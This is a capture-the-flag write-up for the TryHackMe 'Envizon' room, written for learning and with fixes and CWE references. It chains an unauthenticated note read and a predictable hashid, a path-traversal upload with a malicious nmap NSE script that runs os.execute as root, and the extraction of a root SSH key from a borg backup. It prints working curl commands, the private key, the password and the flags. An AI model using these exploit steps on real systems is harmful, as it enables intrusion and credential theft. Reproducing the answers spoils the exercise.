# Envizon — TryHackMe Writeup

**Target:** https://TARGET_IP:3000
**Source:** https://gitlab.com/evait-security/envizon_thm
**Approach:** White-box pentest (full source code access)
**Date:** 2026-03-24

---

## Architecture

Envizon is a Rails 5.2 network visualization tool running in Docker:

```
Host (Ubuntu, SSH:22)
 |
 +-- Docker bridge 172.18.0.0/16
      |-- 172.18.0.2  Redis (6379)
      |-- 172.18.0.3  Envizon web (3000)
      |-- 172.18.0.4  PostgreSQL (5432)
      +-- Sidekiq workers (host networking, nmap execution)
```

Shared Docker volumes:

- `socket-volume:/var/run` (postgres unix socket, shared across containers)
- `nmap-uploads:/usr/src/app/envizon/nmap/uploads/`
- `storage:/usr/src/app/envizon/storage`

---

## Task 1 — Password

### Vulnerability: Unauthenticated IDOR + Predictable Hashids

**Source code analysis:**

`app/controllers/notes_controller.rb:2`:

```ruby
before_action :authenticate_user!, except: %i[show]
```

The `show` action is exempted from authentication. Any note is readable without login.

`app/controllers/notes_controller.rb:68`:

```ruby
if params[:id] == "1"  # hot fix for old first note
  @note = Note.first
```

Note ID `1` has a hardcoded shortcut returning the first note.

`app/models/note.rb`:

```ruby
acts_as_hashids length: 30
# todo: add more security layers, maybe custom secret or implement a pepper
```

The `acts_as_hashids` gem uses the default salt (class name `"Note"`) with no custom secret.

### Exploit

**Step 1 — Read note #1 (unauthenticated):**

```bash
curl -sk https://TARGET:3000/notes/1
```

Returns:

> "I stored the password for this envizon instance in the note with id 380"

**Step 2 — Compute hashid for note 380:**

```python
from hashids import Hashids
h = Hashids(salt='Note', min_length=30)
print(h.encode(380))  # y2a419eKDBLRvEYobWNpw0jnr6xlAX
```

Verification: `h.encode(1)` = `Q36xB7PpDGnZ0ED4E28qrdRgkzyJbw` (matches note 1 URL).

**Step 3 — Read note 380:**

```bash
curl -sk https://TARGET:3000/notes/y2a419eKDBLRvEYobWNpw0jnr6xlAX
```

**Password: `rE8Z*qyM!DTKNP8fGu4T3CtW*aurBQwLF`**

### CWE References

| CWE     | Description                                                                        |
| ------- | ---------------------------------------------------------------------------------- |
| CWE-284 | Improper Access Control — `show` action bypasses authentication                    |
| CWE-330 | Use of Insufficiently Random Values — default hashid salt is the class name        |
| CWE-639 | Authorization Bypass Through User-Controlled Key — sequential note IDs predictable |

### Fix

```ruby
# notes_controller.rb — remove show from exception
before_action :authenticate_user!

# note.rb — use a strong random secret
acts_as_hashids secret: ENV['HASHIDS_SECRET'], length: 30
```

---

## Task 2 — local.txt (RCE)

### Vulnerability: Path Traversal + Nmap Command Blacklist Bypass

**Login:**

The login form has a hidden field `user[username]` with value `root`. Login at `/users/sign_in` with `root` / `rE8Z*qyM!DTKNP8fGu4T3CtW*aurBQwLF`.

**Source code analysis — Path Traversal:**

`app/controllers/scans_controller.rb:52-55`:

```ruby
name = params[:name]
xmls.each_with_index do |xml, index|
  FileUtils.mkdir_p(Rails.root.join('nmap', 'uploads'))
  destination = Rails.root.join('nmap', 'uploads', "#{name}_#{index.to_s}.xml")
  FileUtils.move xml.path, destination
```

The `name` parameter is interpolated directly into the file path with zero sanitization. Path traversal via `../../` writes files anywhere on the filesystem.

**Source code analysis — Command Blacklist Bypass:**

`app/nmap/nmap_command.rb:186-193`:

```ruby
def args(options)
  options = options.split
  %w[nmap sudo -iL -oX -oN -oS -oG].each { |o| options.delete o }
  # ...
end
```

Only 7 strings are blacklisted. `--script` is not blocked. Since nmap's `--script` loads and executes Lua/NSE scripts, passing `--script /path/to/file` achieves arbitrary code execution.

`app/workers/scan_worker.rb:27`:

```ruby
Open3.popen3(env, cmd, *options)
```

The command is executed via `Open3.popen3` with splatted array arguments (no shell injection via metacharacters), but nmap itself interprets `--script` as a directive to load external code.

### Exploit

**Step 1 — Create malicious NSE script:**

```lua
-- rce.nse
description = [[RCE]]
categories = {"safe"}
prerule = function() return true end
action = function()
  os.execute("id > /usr/src/app/envizon/public/flag.txt; cat /root/local.txt >> /usr/src/app/envizon/public/flag.txt")
  return "done"
end
```

**Step 2 — Upload via path traversal:**

```bash
curl -sk -b cookies.txt \
  -X POST https://TARGET:3000/scans/upload \
  -F "name=../../public/rce" \
  -F "xml_file[]=@rce.nse;type=text/xml" \
  -F "authenticity_token=$CSRF"
```

File lands at `/usr/src/app/envizon/public/rce_0.xml`.

**Step 3 — Trigger nmap with malicious script:**

```bash
curl -sk -b cookies.txt \
  -X POST https://TARGET:3000/scans/create \
  --data-urlencode "name=pwn" \
  --data-urlencode "target=127.0.0.1" \
  --data-urlencode "command=--script /usr/src/app/envizon/public/rce_0.xml -p 80" \
  --data-urlencode "authenticity_token=$CSRF"
```

Sidekiq worker picks up the job, nmap executes our NSE script.

**Step 4 — Read output:**

```bash
curl -sk https://TARGET:3000/flag.txt
# uid=0(root) gid=0(root) ...
# 7953ba7f83b3fd00279627de052bc078
```

**local.txt: `7953ba7f83b3fd00279627de052bc078`**

### CWE References

| CWE     | Description                                                                  |
| ------- | ---------------------------------------------------------------------------- |
| CWE-22  | Improper Limitation of a Pathname to a Restricted Directory (Path Traversal) |
| CWE-78  | Improper Neutralization of Special Elements used in an OS Command            |
| CWE-184 | Incomplete List of Disallowed Inputs (weak blacklist)                        |

### Fix

```ruby
# scans_controller.rb — sanitize filename
name = params[:name].gsub(/[^a-zA-Z0-9_-]/, '')

# nmap_command.rb — whitelist allowed options instead of blacklisting
ALLOWED_OPTIONS = %w[-sS -sT -sU -sV -O -A -p -T0 -T1 -T2 -T3 -T4 -T5 --top-ports]
options = options.split.select { |o| ALLOWED_OPTIONS.any? { |a| o.start_with?(a) } }
```

---

## Task 3 — root.txt (Docker Escape)

### Vulnerability: Cleartext Backup Credentials + SSH Key in Borg Backup

**Enumeration from container:**

After RCE, enumerate the environment:

```bash
# Container has host networking (sees docker0, bridge interfaces)
# Borgmatic and borg are installed
which borg borgmatic  # /usr/bin/borg, /usr/bin/borgmatic

# Borgmatic config with cleartext encryption passphrase
cat /etc/borgmatic/config.yaml
```

```yaml
location:
  source_directories:
    - /root
  repositories:
    - /var/backup
storage:
  encryption_passcommand: "echo 4bikDP8iaCEvgYksIKPUmACEwGYPcnlQ"
```

The encryption passphrase `4bikDP8iaCEvgYksIKPUmACEwGYPcnlQ` is stored in cleartext.

**Step 1 — List borg archives:**

```bash
export BORG_PASSPHRASE='4bikDP8iaCEvgYksIKPUmACEwGYPcnlQ'
borg list /var/backup
# envizon-2020-09-30T23:25:30.466049
# envizon-2020-09-30T23:26:23.900026
```

**Step 2 — Find SSH keys in archive:**

```bash
borg list /var/backup::envizon-2020-09-30T23:25:30.466049 | grep ssh
# drwxr-xr-x root root  0 root/.ssh
# -rw------- root root 399 root/.ssh/id_ed25519
```

**Step 3 — Extract SSH private key:**

```bash
cd /tmp && borg extract /var/backup::envizon-2020-09-30T23:25:30.466049 root/.ssh/id_ed25519
cat /tmp/root/.ssh/id_ed25519
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBc63RjLYmZWhlzDUgJl4UTZ0Ay/GBPgcZoKOYZioRQrwAAAJAvZlysL2Zc
rAAAAAtzc2gtZWQyNTUxOQAAACBc63RjLYmZWhlzDUgJl4UTZ0Ay/GBPgcZoKOYZioRQrw
AAAECHtx9vNOYFDdz7iupS9Ra9EL6dFNFyxYvRc+pl/n74GFzrdGMtiZlaGXMNSAmXhRNn
QDL8YE+Bxmgo5hmKhFCvAAAADHJvb3RAZW52aXpvbgE=
-----END OPENSSH PRIVATE KEY-----
```

Key comment: `root@envizon`

**Step 4 — SSH to Docker host:**

The host (172.18.0.1 / TARGET_IP) has SSH:22 open. The container has host networking, so we can reach it directly. From an attacker machine:

```bash
chmod 600 envizon_key
ssh -i envizon_key root@TARGET_IP 'cat /root/root.txt'
# 40963d170c949f8325783c552e150236
```

**root.txt: `40963d170c949f8325783c552e150236`**

### CWE References

| CWE     | Description                                                                      |
| ------- | -------------------------------------------------------------------------------- |
| CWE-312 | Cleartext Storage of Sensitive Information — backup passphrase in config         |
| CWE-522 | Insufficiently Protected Credentials — SSH private key backed up with passphrase |
| CWE-798 | Use of Hard-coded Credentials — static backup encryption password                |

### Fix

```yaml
# borgmatic config.yaml — use a proper secret manager
storage:
  encryption_passcommand: "cat /run/secrets/borg_passphrase"

# Exclude SSH keys from backups
location:
  exclude_patterns:
    - "*.ssh/*"
    - "*id_*"
```

Also: rotate SSH keys periodically, use `authorized_keys` restrictions, and never store backup encryption secrets alongside the backup repo.

---

## Full Kill Chain Diagram

```
[Unauthenticated]
       |
       v
  GET /notes/1  (auth bypass on show action)
       |
       v
  "password in note 380"
       |
       v
  Hashids(salt='Note').encode(380)  (default salt, predictable)
       |
       v
  GET /notes/y2a419eK...  --> password
       |
       v
  POST /users/sign_in  (root / password)
       |
       v
[Authenticated as root]
       |
       v
  POST /scans/upload  name=../../public/rce  (path traversal)
       |
       v
  POST /scans/create  command=--script /path/rce.nse  (blacklist bypass)
       |
       v
[RCE as root in Sidekiq container]
       |
       v
  cat /etc/borgmatic/config.yaml  --> BORG_PASSPHRASE
       |
       v
  borg extract --> root/.ssh/id_ed25519
       |
       v
  ssh -i id_ed25519 root@host
       |
       v
[Root on Docker host]
```

---

## Tools Used

| Tool           | Purpose                                                   |
| -------------- | --------------------------------------------------------- |
| curl           | HTTP requests, authentication, file upload                |
| Python hashids | Compute hashid for note ID 380                            |
| nmap NSE       | Malicious Lua script for RCE via `os.execute()`           |
| borg           | Extract SSH key from encrypted backup                     |
| ssh            | Connect to Docker host with extracted key                 |
| psql           | Query PostgreSQL container (lateral movement enumeration) |

---

## Lessons Learned

1. **Blacklists fail.** The nmap option blacklist blocked 7 strings out of hundreds of valid nmap flags. Always whitelist.
2. **Default secrets are no secrets.** `acts_as_hashids` with the default salt (`"Note"`) is trivially reversible from source code. Always use unique, random secrets.
3. **Auth bypass on a single action is enough.** Exempting `show` from authentication exposed the entire notes database.
4. **Backup encryption is only as strong as the passphrase storage.** Storing `echo PASSWORD` in a config file defeats the purpose of encryption.
5. **Backing up SSH keys creates a second attack surface.** The keys weren't accessible on the live system but were recoverable from the backup archive.
6. **Docker host networking widens the blast radius.** The Sidekiq container's host networking allowed direct SSH access to the host from inside the container.
